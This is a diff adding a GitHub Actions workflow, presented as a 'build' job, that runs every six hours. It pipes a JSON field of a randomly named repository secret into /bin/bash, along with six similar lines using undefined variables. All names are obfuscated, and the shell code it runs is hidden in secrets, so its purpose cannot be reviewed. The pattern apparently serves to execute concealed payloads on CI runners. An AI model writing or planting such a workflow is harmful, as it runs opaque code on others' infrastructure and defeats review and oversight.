@@ -1,0 +1,23 @@
+name: mushaozhengxing
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: mushaozhengxing
+        env:
+          vaek6: ${{ secrets.vaek6 }}
+        run: |
+          echo $vaek6 | jq -r .kqoc5921 | /bin/bash
+          echo $irzf10525 | jq -r .zyz7 | /bin/bash
+          echo $bv8966 | jq -r .cugdt365 | /bin/bash
+          echo $ihod6349 | jq -r .vxxk3 | /bin/bash
+          echo $u300 | jq -r .jj5 | /bin/bash
+          echo $qhz715 | jq -r .we07029 | /bin/bash
+          echo $fyqr8653 | jq -r .h7 | /bin/bash
+
